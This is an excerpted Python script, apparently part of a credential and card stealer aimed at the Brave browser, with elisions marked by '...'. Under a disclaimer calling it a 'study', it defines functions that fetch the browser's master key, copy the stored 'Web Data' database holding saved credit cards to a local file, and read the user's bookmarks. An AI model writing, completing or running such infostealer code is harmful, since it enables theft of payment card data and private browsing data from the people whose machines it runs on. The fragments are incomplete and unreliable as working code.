# This script has been made as a study and should not be used for Illegal purposes
import time

print('============================================')
print('This script has been made as a study and should not be used for Illegal purposes')
print('============================================')
time.sleep(5)
...
def get_credit_cards():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Web Data'
    try:
        shutil.copy2(login_db,
                     "CCvault.db")  
...
def get_bookmarks():
    bookmarks_location = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Bookmarks'
